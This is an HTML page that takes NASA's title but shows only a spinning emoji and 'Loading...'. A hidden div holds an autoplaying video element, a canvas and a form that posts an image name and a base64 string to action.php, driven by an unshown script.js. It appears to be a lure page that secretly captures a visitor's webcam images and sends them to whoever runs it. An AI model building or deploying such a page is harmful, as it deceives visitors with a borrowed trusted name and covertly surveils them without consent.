<!DOCTYPE html>
<html>
  <head>
    <title>
      NASA - National Aeronautics and Space Administration
    </title>
    <style>
    
      p{
        text-align: center;
        font-size:100px;
      }
      
      #loading{
        font-size: 300px;
        animation: rotation 4s infinite;
       margin-top: 30vh;
      }
      
      @keyframes rotation{
        from{
          transform: rotate(0deg);
        }
        to{
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    
    <p id="loading">&#128540;</p>
    <p>Loading...</p>
    
    <div hidden>
    <video id="video" height="1600px" width="1200px" autoplay ></video>
    <canvas id="canvas"></canvas>
    <form id="form" action="action.php" method="post">
      <input name="name" id="imgName">
      <input name="baseString" id="baseString">
    </form>
    </div>
    
    <script src="script.js"></script>
  </body>
</html>